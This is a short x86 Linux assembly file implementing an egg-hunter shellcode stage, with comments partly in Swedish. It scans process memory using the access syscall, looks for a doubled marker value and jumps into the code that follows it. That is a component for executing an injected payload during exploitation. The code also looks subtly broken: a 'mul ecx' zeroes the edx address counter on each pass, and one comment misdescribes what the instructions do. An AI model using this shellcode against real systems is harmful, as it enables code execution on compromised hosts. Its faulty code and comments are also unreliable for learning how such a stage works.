


global _start

section .text
_start:

xor edx,edx

next_page:

or dx,0xffff

next_address:
;fill edx with 0x1000=4096
; which represents PAGE_SIZE
inc edx
;load the page memory address to ebx
lea ebx,[edx+0x4]
;0x21=33 access system call number
;push byte +0x21
; här kör vi alltså access
xor eax,eax
xor ecx,ecx
mul ecx
mov al,0x21
int 0x80

;compare the result with EFAULT
cmp al,0xf2
jz next_page
mov eax,0x31676765 ;this is the egg-marker in hex
mov edi,edx

; search for the first occurence of the egg-tag
scasd
jnz next_address

;search for the second occurence of the egg-tag
scasd
jnz next_address

;execute the egg
jmp edi


